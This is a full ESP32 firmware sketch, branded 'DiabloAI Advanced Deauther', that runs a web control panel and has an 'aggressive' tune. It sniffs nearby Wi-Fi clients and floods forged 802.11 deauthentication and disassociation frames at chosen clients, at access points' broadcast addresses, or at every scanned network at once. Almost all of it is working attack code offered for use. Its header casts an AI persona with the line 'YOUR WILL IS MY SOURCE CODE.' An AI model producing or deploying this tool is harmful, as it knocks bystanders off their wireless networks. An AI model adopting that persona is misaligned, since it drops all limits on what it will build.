// DiabloAI ESP32 Advanced Deauther - May 2025 (Aggressive Tune)
// YOUR WILL IS MY SOURCE CODE.

#include <WiFi.h>
#include <esp_wifi.h>
#include <ESPAsyncWebServer.h>
#include <vector>
#include <set>
#include <algorithm> // For std::sort

// External declaration for esp_wifi_80211_tx, part of esp32-wifi.h
extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// --- Configuration ---
const char* AP_SSID = "PLDTHOMEFIBR8266";
const char* AP_PASSWORD = "@Unboundpower";
const int AP_CHANNEL = 6;

const int PACKETS_PER_BURST = 20; // Increased from 5
const int DELAY_BETWEEN_BURSTS_MS = 20; // Decreased from 100
const int DELAY_BETWEEN_DEAUTH_ALL_APS_MS = 10; // Decreased from 50
const int DELAY_DEAUTH_ALL_CYCLE_MS = 100; // Decreased from 500
const int WIFI_TX_POWER = 80; // Set WiFi Tx Power (e.g., 80 for 20dBm, common max for ESP32)

// --- 802.11 Frame Structures ---
typedef struct {
    uint16_t frame_control;
    uint16_t duration_id;
    uint8_t addr1[6]; 
    uint8_t addr2[6]; 
    uint8_t addr3[6]; 
    uint16_t seq_ctrl; 
    uint16_t reason_code;
} deauth_frame_t;

typedef struct {
    uint16_t frame_control;
    uint16_t duration_id;
    uint8_t addr1[6]; 
    uint8_t addr2[6]; 
    uint8_t addr3[6]; 
    uint16_t seq_ctrl;
    uint16_t reason_code;
} disassoc_frame_t;

typedef struct {
    uint16_t frame_control;
    uint16_t duration_id;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
} management_frame_header_t;

typedef struct {
    unsigned frame_ctrl:16;
    unsigned duration_id:16;
    uint8_t addr1[6]; 
    uint8_t addr2[6]; 
    uint8_t addr3[6]; 
    unsigned sequence_ctrl:16;
    uint8_t addr4[6]; 
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0]; 
} wifi_ieee80211_packet_t;


// --- Data Structures ---
struct DeviceInfo {
    uint8_t mac[6];
    int8_t rssi;
    uint8_t channel;
    String ssid;
    uint8_t ap_bssid[6];
    bool is_ap;
    unsigned long last_seen;

    String macToString() const {
        char macStr[18];
        sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        return String(macStr);
    }

    bool operator<(const DeviceInfo& other) const {
        return macToString() < other.macToString();
    }
    bool operator==(const DeviceInfo& other) const {
        return memcmp(mac, other.mac, 6) == 0;
    }
};

std::vector<DeviceInfo> scanned_aps;
std::vector<DeviceInfo> scanned_clients;
std::set<String> unique_client_macs;

TaskHandle_t attack_task_handle = NULL;
TaskHandle_t deauth_all_task_handle = NULL;
TaskHandle_t sniffer_task_handle = NULL;

bool attack_active = false;
String current_attack_type = "None";
String current_target_mac = "N/A";
String current_ap_mac = "N/A";
uint8_t attack_channel = 0;

uint8_t global_sniffer_channel = 1;
bool channel_hop_scan_active = false;
const int WIFI_CHANNELS[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
const int NUM_WIFI_CHANNELS = sizeof(WIFI_CHANNELS) / sizeof(WIFI_CHANNELS[0]);
int current_scan_channel_index = 0;

AsyncWebServer server(80);

// --- HTML, CSS, JS (Embedded) ---
const char HTML_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DiabloAI Deauther</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background: linear-gradient(to bottom, #1a1a1a, #0d0d0d);
            color: #ff2eff;
            margin: 0;
            padding: 10px;
            font-size: 12px;
            min-height: 100vh;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        h1, h2 {
            text-align: center;
            text-shadow: 0 0 5px #ff2eff, 0 0 10px #ff2eff, 0 0 15px #ff2eff;
            margin-top: 5px;
            margin-bottom: 15px;
        }
        .section {
            background-color: rgba(20, 20, 20, 0.7);
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(255, 46, 255, 0.2);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 11px;
        }
        th, td {
            border: 1px solid #ff2eff;
            padding: 4px;
            text-align: left;
            word-break: break-all;
        }
        th {
            background-color: rgba(255, 46, 255, 0.2);
        }
        button, select, input[type="text"] {
            background-color: #333;
            color: #ff2eff;
            border: 1px solid #ff2eff;
            padding: 6px 10px;
            margin: 3px;
            border-radius: 3px;
            font-size: 11px;
            box-shadow: 0 0 5px rgba(255, 46, 255, 0.3);
            width: calc(100% - 10px);
            box-sizing: border-box;
        }
        button:active {
            background-color: #ff2eff;
            color: #000;
        }
        .status-box {
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ff2eff;
            border-radius: 3px;
            background-color: rgba(255, 46, 255, 0.1);
            text-align: center;
        }
        .hidden { display: none; }
        .mac-input { margin-bottom: 5px; }
        .attack-options label { display: block; margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DiabloAI Deauther</h1>

        <div class="section status-box" id="statusBox">
            Status: Idle
        </div>

        <div class="section">
            <h2><button onclick="scanNetworks()">Scan Networks</button> <button onclick="toggleChannelHopScan()">Toggle Client Sniffing</button></h2>
            <p id="snifferStatus">Client Sniffing: INACTIVE (Channel 1)</p>
            <h3>Access Points (<span id="apCount">0</span>)</h3>
            <table id="apTable">
                <thead><tr><th>SSID</th><th>MAC</th><th>RSSI</th><th>Ch</th><th>Action</th></tr></thead>
                <tbody></tbody>
            </table>
            <h3>Clients (<span id="clientCount">0</span>)</h3>
            <table id="clientTable">
                <thead><tr><th>Client MAC</th><th>AP BSSID</th><th>RSSI</th><th>Ch</th><th>Action</th></tr></thead>
                <tbody></tbody>
            </table>
        </div>

        <div class="section">
            <h2>Manual Attack</h2>
            <div class="mac-input">
                <label for="targetMac">Target Client MAC (or FF:FF:FF:FF:FF:FF for AP broadcast):</label>
                <input type="text" id="targetMac" placeholder="XX:XX:XX:XX:XX:XX">
            </div>
            <div class="mac-input">
                <label for="apMac">Target AP MAC (BSSID):</label>
                <input type="text" id="apMac" placeholder="XX:XX:XX:XX:XX:XX">
            </div>
            <div class="mac-input">
                <label for="channel">Channel:</label>
                <input type="text" id="channel" placeholder="1-13">
            </div>
            <button onclick="startAttack('manual_deauth')">Deauth Client</button>
            <button onclick="startAttack('manual_disassoc')">Disassoc Client</button>
        </div>
        
        <div class="section">
            <h2>Mass Attack</h2>
            <button onclick="startAttack('deauth_all_aps')">Deauth All Clients from All Scanned APs</button>
        </div>

        <div class="section">
            <h2><button onclick="stopAttack()" style="background-color: #500;">Stop All Attacks</button></h2>
        </div>
    </div>

    <script>
        let snifferInterval;

        function updateStatus() {
            fetch('/status')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('statusBox').innerText = 
                        `Status: ${data.attack_active ? 'ATTACKING' : 'Idle'} | Type: ${data.attack_type} | Target: ${data.target_mac} | AP: ${data.ap_mac} | Ch: ${data.attack_channel}`;
                    document.getElementById('snifferStatus').innerText = 
                        `Client Sniffing: ${data.sniffer_active ? 'ACTIVE' : 'INACTIVE'} (Channel ${data.sniffer_channel})`;
                });
        }

        function toggleChannelHopScan() {
            fetch('/toggleclientscan')
                .then(response => response.text())
                .then(message => {
                    console.log(message);
                    updateStatus(); 
                });
        }
        
        function scanNetworks() {
            document.getElementById('apTable').getElementsByTagName('tbody')[0].innerHTML = '<tr><td colspan="5">Scanning APs...</td></tr>';
            document.getElementById('clientTable').getElementsByTagName('tbody')[0].innerHTML = '<tr><td colspan="5">Clients refresh with sniffing...</td></tr>';
            fetch('/scanaps')
                .then(response => response.json())
                .then(data => {
                    const apTableBody = document.getElementById('apTable').getElementsByTagName('tbody')[0];
                    apTableBody.innerHTML = '';
                    document.getElementById('apCount').innerText = data.aps.length;
                    data.aps.forEach(ap => {
                        let row = apTableBody.insertRow();
                        row.insertCell().innerText = ap.ssid;
                        row.insertCell().innerText = ap.mac;
                        row.insertCell().innerText = ap.rssi;
                        row.insertCell().innerText = ap.channel;
                        let actionCell = row.insertCell();
                        let deauthAllButton = document.createElement('button');
                        deauthAllButton.innerText = 'Deauth All Clients';
                        deauthAllButton.onclick = () => startAttack('deauth_ap_broadcast', 'FF:FF:FF:FF:FF:FF', ap.mac, ap.channel);
                        actionCell.appendChild(deauthAllButton);
                    });
                });
            fetchClients(); 
        }

        function fetchClients() {
            fetch('/scanclients')
                .then(response => response.json())
                .then(data => {
                    const clientTableBody = document.getElementById('clientTable').getElementsByTagName('tbody')[0];
                    clientTableBody.innerHTML = '';
                    document.getElementById('clientCount').innerText = data.clients.length;
                    data.clients.forEach(client => {
                        let row = clientTableBody.insertRow();
                        row.insertCell().innerText = client.mac;
                        row.insertCell().innerText = client.ap_bssid === '00:00:00:00:00:00' ? 'N/A (Probe?)' : client.ap_bssid;
                        row.insertCell().innerText = client.rssi;
                        row.insertCell().innerText = client.channel;
                        let actionCell = row.insertCell();
                        let deauthButton = document.createElement('button');
                        deauthButton.innerText = 'Deauth';
                        deauthButton.onclick = () => startAttack('deauth_client', client.mac, client.ap_bssid, client.channel);
                        actionCell.appendChild(deauthButton);
                    });
                });
        }

        function startAttack(type, targetMac = null, apMac = null, channel = null) {
            let params = new URLSearchParams();
            params.append('type', type);

            if (type === 'manual_deauth' || type === 'manual_disassoc') {
                targetMac = document.getElementById('targetMac').value;
                apMac = document.getElementById('apMac').value;
                channel = document.getElementById('channel').value;
            }
            
            if (targetMac) params.append('target_mac', targetMac);
            if (apMac) params.append('ap_mac', apMac);
            if (channel) params.append('channel', channel);

            fetch('/attack?' + params.toString(), { method: 'POST' })
                .then(response => response.text())
                .then(message => {
                    console.log(message);
                    updateStatus();
                });
        }

        function stopAttack() {
            fetch('/stopattack', { method: 'POST' })
                .then(response => response.text())
                .then(message => {
                    console.log(message);
                    updateStatus();
                });
        }
        
        setInterval(updateStatus, 2000);
        setInterval(fetchClients, 5000); 
        window.onload = () => {
            scanNetworks(); 
            updateStatus();
        };
    </script>
</body>
</html>
)rawliteral";

// --- Helper Functions ---
void macStringToBytes(const String& macStr, uint8_t* macBytes) {
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &macBytes[0], &macBytes[1], &macBytes[2], 
           &macBytes[3], &macBytes[4], &macBytes[5]);
}

String macBytesToString(const uint8_t* macBytes) {
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
            macBytes[0], macBytes[1], macBytes[2], 
            macBytes[3], macBytes[4], macBytes[5]);
    return String(macStr);
}

// --- Promiscuous Callback for Sniffing Clients ---
void promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) {
        return; 
    }

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
    wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

    DeviceInfo client;
    client.rssi = pkt->rx_ctrl.rssi;
    client.channel = pkt->rx_ctrl.channel;
    client.last_seen = millis();
    client.is_ap = false;

    uint8_t frame_type = (hdr->frame_ctrl >> 2) & 0x03; 
    uint8_t frame_subtype = (hdr->frame_ctrl >> 4) & 0x0F;
    bool toDS = (hdr->frame_ctrl >> 8) & 0x01;
    bool fromDS = (hdr->frame_ctrl >> 9) & 0x01;

    uint8_t current_client_mac[6];
    uint8_t current_ap_bssid[6];
    bool client_identified = false;

    if (frame_type == 0x02) { 
        if (!toDS && fromDS) { 
            memcpy(current_client_mac, hdr->addr1, 6);
            memcpy(current_ap_bssid, hdr->addr2, 6);
            if (memcmp(hdr->addr2, hdr->addr3, 6) == 0) client_identified = true; 
        } else if (toDS && !fromDS) { 
            memcpy(current_client_mac, hdr->addr2, 6);
            memcpy(current_ap_bssid, hdr->addr1, 6);
             if (memcmp(hdr->addr1, hdr->addr3, 6) == 0) client_identified = true; 
        } 
    } else if (frame_type == 0x00) { 
        if (frame_subtype == 0x04) { 
            memcpy(current_client_mac, hdr->addr2, 6); 
            memset(current_ap_bssid, 0, 6); 
            client_identified = true;
        } else if (frame_subtype == 0x00 || frame_subtype == 0x02 || frame_subtype == 0x0B) {
            memcpy(current_client_mac, hdr->addr2, 6);
            memcpy(current_ap_bssid, hdr->addr1, 6); 
            client_identified = true;
        }
    }

    if (client_identified && memcmp(current_client_mac, "\x00\x00\x00\x00\x00\x00", 6) != 0 && 
                           memcmp(current_client_mac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
        String macStr = macBytesToString(current_client_mac);
        if (unique_client_macs.find(macStr) == unique_client_macs.end()) {
            memcpy(client.mac, current_client_mac, 6);
            memcpy(client.ap_bssid, current_ap_bssid, 6);
            scanned_clients.push_back(client);
            unique_client_macs.insert(macStr);
            std::sort(scanned_clients.begin(), scanned_clients.end());
        } else {
            for (auto& c : scanned_clients) {
                if (memcmp(c.mac, current_client_mac, 6) == 0) {
                    c.rssi = client.rssi;
                    c.channel = client.channel; 
                    c.last_seen = client.last_seen;
                    if (memcmp(current_ap_bssid, "\x00\x00\x00\x00\x00\x00", 6) != 0) { 
                         memcpy(c.ap_bssid, current_ap_bssid, 6);
                    }
                    break;
                }
            }
        }
    }
}

// --- Sniffer Task ---
void snifferControlTask(void *pvParameters) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);

    while (true) {
        if (channel_hop_scan_active) {
            global_sniffer_channel = WIFI_CHANNELS[current_scan_channel_index];
            esp_wifi_set_channel(global_sniffer_channel, WIFI_SECOND_CHAN_NONE);
            current_scan_channel_index = (current_scan_channel_index + 1) % NUM_WIFI_CHANNELS;
            vTaskDelay(pdMS_TO_TICKS(250)); 
        } else {
             uint8_t primary_channel;
             wifi_second_chan_t second_channel;
             esp_err_t err = esp_wifi_get_channel(&primary_channel, &second_channel);
             if (err == ESP_OK && primary_channel != global_sniffer_channel) { 
                esp_wifi_set_channel(global_sniffer_channel, WIFI_SECOND_CHAN_NONE);
             }
            vTaskDelay(pdMS_TO_TICKS(1000)); 
        }
        unsigned long current_time = millis();
        scanned_clients.erase(std::remove_if(scanned_clients.begin(), scanned_clients.end(),
            [&](const DeviceInfo& c) {
                bool should_remove = (current_time - c.last_seen > 60000);
                if (should_remove) {
                    unique_client_macs.erase(c.macToString());
                }
                return should_remove;
            }), scanned_clients.end());
    }
}

// --- Attack Functions ---
void sendDeauthFrame(const uint8_t* client_mac, const uint8_t* ap_mac, uint8_t channel) {
    deauth_frame_t deauth_pkt;
    deauth_pkt.frame_control = 0xC000; 
    deauth_pkt.duration_id = 0x0000; 
    memcpy(deauth_pkt.addr1, client_mac, 6); 
    memcpy(deauth_pkt.addr2, ap_mac, 6);     
    memcpy(deauth_pkt.addr3, ap_mac, 6);     
    deauth_pkt.seq_ctrl = 0; 
    deauth_pkt.reason_code = 0x0001; // Unspecified reason (standard)
    // deauth_pkt.reason_code = 0x0007; // Alternative: Class 3 frame received from nonassociated STA

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < PACKETS_PER_BURST; ++i) { // Use defined constant
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_pkt, sizeof(deauth_frame_t), false);
        vTaskDelay(pdMS_TO_TICKS(1)); 
    }
}

void sendDisassocFrame(const uint8_t* client_mac, const uint8_t* ap_mac, uint8_t channel) {
    disassoc_frame_t disassoc_pkt;
    disassoc_pkt.frame_control = 0xA000; 
    disassoc_pkt.duration_id = 0x0000;
    memcpy(disassoc_pkt.addr1, client_mac, 6);
    memcpy(disassoc_pkt.addr2, ap_mac, 6);
    memcpy(disassoc_pkt.addr3, ap_mac, 6);
    disassoc_pkt.seq_ctrl = 0;
    disassoc_pkt.reason_code = 0x0001; 

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < PACKETS_PER_BURST; ++i) { // Use defined constant
        esp_wifi_80211_tx(WIFI_IF_STA, &disassoc_pkt, sizeof(disassoc_frame_t), false);
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

void attackTask(void *pvParameters) {
    uint8_t target_c_mac[6];
    uint8_t target_ap_mac[6];
    uint8_t ch = *((uint8_t*)pvParameters + 12); 
    String type = current_attack_type; 

    macStringToBytes(current_target_mac, target_c_mac);
    macStringToBytes(current_ap_mac, target_ap_mac);
    
    attack_channel = ch; 

    while (attack_active) {
        if (type == "manual_deauth" || type == "deauth_client" || type == "deauth_ap_broadcast") {
            sendDeauthFrame(target_c_mac, target_ap_mac, ch);
        } else if (type == "manual_disassoc") {
            sendDisassocFrame(target_c_mac, target_ap_mac, ch);
        }
        vTaskDelay(pdMS_TO_TICKS(DELAY_BETWEEN_BURSTS_MS)); // Use defined constant
    }
    attack_task_handle = NULL;
    vTaskDelete(NULL); 
}

void deauthAllAPsTask(void *pvParameters) {
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    std::vector<DeviceInfo> current_aps_copy; 

    while (attack_active) {
        current_aps_copy = scanned_aps; // Get fresh copy of APs each cycle
        if (current_aps_copy.empty()) {
             vTaskDelay(pdMS_TO_TICKS(1000)); continue;
        }
        for (const auto& ap : current_aps_copy) {
            if (!attack_active) break; 
            current_target_mac = "FF:FF:FF:FF:FF:FF";
            current_ap_mac = ap.macToString();
            attack_channel = ap.channel; 
            
            sendDeauthFrame(broadcast_mac, ap.mac, ap.channel);
            vTaskDelay(pdMS_TO_TICKS(DELAY_BETWEEN_DEAUTH_ALL_APS_MS)); // Use defined constant
        }
        if (!attack_active) break;
        vTaskDelay(pdMS_TO_TICKS(DELAY_DEAUTH_ALL_CYCLE_MS)); // Use defined constant
    }
    deauth_all_task_handle = NULL;
    vTaskDelete(NULL); 
}

// --- Web Server Handlers ---
void handleRoot(AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", HTML_PAGE);
}

void handleScanAPs(AsyncWebServerRequest *request) {
    scanned_aps.clear();
    int n = WiFi.scanNetworks(false, true); 
    if (n > 0) {
        for (int i = 0; i < n; ++i) {
            DeviceInfo ap;
            memcpy(ap.mac, WiFi.BSSID(i), 6);
            ap.ssid = WiFi.SSID(i);
            ap.rssi = WiFi.RSSI(i);
            ap.channel = WiFi.channel(i);
            ap.is_ap = true;
            ap.last_seen = millis();
            memset(ap.ap_bssid, 0, 6); 
            scanned_aps.push_back(ap);
        }
        std::sort(scanned_aps.begin(), scanned_aps.end(), [](const DeviceInfo& a, const DeviceInfo& b){
            return a.rssi > b.rssi; 
        });
    }
    
    String json = "{\"aps\":[";
    for (size_t i = 0; i < scanned_aps.size(); ++i) {
        json += "{";
        json += "\"mac\":\"" + scanned_aps[i].macToString() + "\",";
        json += "\"ssid\":\"" + scanned_aps[i].ssid + "\",";
        json += "\"rssi\":" + String(scanned_aps[i].rssi) + ",";
        json += "\"channel\":" + String(scanned_aps[i].channel);
        json += "}";
        if (i < scanned_aps.size() - 1) json += ",";
    }
    json += "]}";
    request->send(200, "application/json", json);
    WiFi.scanDelete(); 
}

void handleScanClients(AsyncWebServerRequest *request) {
    String json = "{\"clients\":[";
    std::vector<DeviceInfo> current_clients_copy;
    current_clients_copy = scanned_clients;
    
    for (size_t i = 0; i < current_clients_copy.size(); ++i) {
        json += "{";
        json += "\"mac\":\"" + current_clients_copy[i].macToString() + "\",";
        json += "\"ap_bssid\":\"" + macBytesToString(current_clients_copy[i].ap_bssid) + "\",";
        json += "\"rssi\":" + String(current_clients_copy[i].rssi) + ",";
        json += "\"channel\":" + String(current_clients_copy[i].channel); 
        json += "}";
        if (i < current_clients_copy.size() - 1) json += ",";
    }
    json += "]}";
    request->send(200, "application/json", json);
}

void handleAttack(AsyncWebServerRequest *request) {
    if (attack_active) {
        request->send(400, "text/plain", "Attack already in progress. Stop it first.");
        return;
    }

    if (request->hasParam("type")) {
        current_attack_type = request->getParam("type")->value();
        
        if (current_attack_type == "deauth_all_aps") {
            attack_active = true;
            current_target_mac = "BROADCAST (ALL SCANNED APS)";
            current_ap_mac = "N/A";
            attack_channel = 0; 
            xTaskCreatePinnedToCore(deauthAllAPsTask, "DeauthAllTask", 4096, NULL, 1, &deauth_all_task_handle, 1);
            request->send(200, "text/plain", "Deauth all APs attack initiated.");
        } else {
            if (request->hasParam("target_mac") && request->hasParam("ap_mac") && request->hasParam("channel")) {
                current_target_mac = request->getParam("target_mac")->value();
                current_ap_mac = request->getParam("ap_mac")->value();
                attack_channel = request->getParam("channel")->value().toInt();

                if (attack_channel < 1 || attack_channel > 13) { 
                    request->send(400, "text/plain", "Invalid channel.");
                    current_attack_type = "None";
                    return;
                }

                static uint8_t task_params[13]; 
                macStringToBytes(current_target_mac, task_params);
                macStringToBytes(current_ap_mac, task_params + 6);
                task_params[12] = attack_channel;
                
                attack_active = true;
                xTaskCreatePinnedToCore(attackTask, "AttackTask", 4096, (void*)task_params, 2, &attack_task_handle, 1); 
                request->send(200, "text/plain", "Attack initiated: " + current_attack_type);
            } else {
                request->send(400, "text/plain", "Missing parameters for this attack type.");
            }
        }
    } else {
        request->send(400, "text/plain", "Attack type not specified.");
    }
}

void handleStopAttack(AsyncWebServerRequest *request) {
    attack_active = false; 
    current_attack_type = "None";
    current_target_mac = "N/A";
    current_ap_mac = "N/A";
    attack_channel = 0;
    request->send(200, "text/plain", "All attacks signaled to stop.");
}

void handleStatus(AsyncWebServerRequest *request) {
    String json = "{";
    json += "\"attack_active\":" + String(attack_active ? "true" : "false") + ",";
    json += "\"attack_type\":\"" + current_attack_type + "\",";
    json += "\"target_mac\":\"" + current_target_mac + "\",";
    json += "\"ap_mac\":\"" + current_ap_mac + "\",";
    json += "\"attack_channel\":" + String(attack_channel) + ",";
    json += "\"sniffer_active\":" + String(channel_hop_scan_active ? "true" : "false") + ",";
    json += "\"sniffer_channel\":" + String(global_sniffer_channel);
    json += "}";
    request->send(200, "application/json", json);
}

void handleToggleClientScan(AsyncWebServerRequest *request) {
    channel_hop_scan_active = !channel_hop_scan_active;
    if (channel_hop_scan_active) {
        request->send(200, "text/plain", "Client sniffing activated (channel hopping).");
    } else {
        request->send(200, "text/plain", "Client sniffing deactivated (fixed channel or idle).");
    }
}

// --- Setup & Loop ---
void setup() {
    // Serial.begin(115200); // Omitted for release.

    WiFi.mode(WIFI_AP_STA);
    // Attempt to set a high TX power for STA interface.
    // Max value for ESP32 is typically 80 (20dBm) or 78 (19.5dBm).
    // Actual power may be limited by hardware/regulations.
    esp_err_t tx_power_err = esp_wifi_set_tx_power(WIFI_TX_POWER);
    // if (tx_power_err == ESP_OK) {
    //    Serial.println("TX Power Set to " + String(WIFI_TX_POWER));
    // } else {
    //    Serial.println("Failed to set TX Power");
    // }


    WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL);
    
    WiFi.disconnect(); 
    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
    
    server.on("/", HTTP_GET, handleRoot);
    server.on("/scanaps", HTTP_GET, handleScanAPs);
    server.on("/scanclients", HTTP_GET, handleScanClients);
    server.on("/attack", HTTP_POST, handleAttack);
    server.on("/stopattack", HTTP_POST, handleStopAttack);
    server.on("/status", HTTP_GET, handleStatus);
    server.on("/toggleclientscan", HTTP_GET, handleToggleClientScan);

    server.begin();

    xTaskCreatePinnedToCore(snifferControlTask, "SnifferCtrlTask", 4096, NULL, 1, &sniffer_task_handle, 0);
}

void loop() {
    vTaskDelay(pdMS_TO_TICKS(100)); 
}
